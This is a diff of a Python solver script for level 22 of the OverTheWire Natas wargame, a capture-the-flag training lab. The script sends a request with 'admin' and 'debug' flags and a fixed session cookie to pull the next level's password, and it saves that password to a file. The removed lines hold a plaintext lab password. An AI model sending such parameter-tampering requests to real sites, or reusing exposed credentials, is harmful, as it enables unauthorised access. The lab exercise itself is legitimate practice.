@@ -13,13 +13,19 @@ def writeResponse(enumerate = ''):
         browserFile.write(soup.prettify())
 
 
-url = 'http://natas22.natas.labs.overthewire.org'
-lvl_pass = requests.auth.HTTPBasicAuth('natas22','91awVM9oDiUGm33JdzM7RVLBS8bz9n0s')
+
+lvl = '22'
+next_level = str(int(lvl)+1)
+pwd = open(f"./passwords/{'natas'+'0'+lvl if len(lvl)==1 else 'natas'+lvl}.pwd", 'r').read().strip()
+url = f'http://natas{lvl}.natas.labs.overthewire.org'
+lvl_pass = requests.auth.HTTPBasicAuth(f'natas{lvl}',pwd)
+
 my_cookies = {"PHPSESSID":'kij2rv5fvgd4v22ekal24idbj7'}
 my_params = {"revelio":"true","admin":"1","debug":"true"}
 
 res, soup = make()
-print(re.search(r"Password: [a-zA-Z0-9]{32}", soup.find("div",id="content").text)[0][10:])
+pw = re.search(r"Password: [a-zA-Z0-9]{32}", soup.find("div",id="content").text)[0][10:]
+open(f"./passwords/{'natas'+'0'+next_level if len(next_level)==1 else 'natas'+next_level}.pwd", 'w').write(pw)
 
 writeResponse()
 
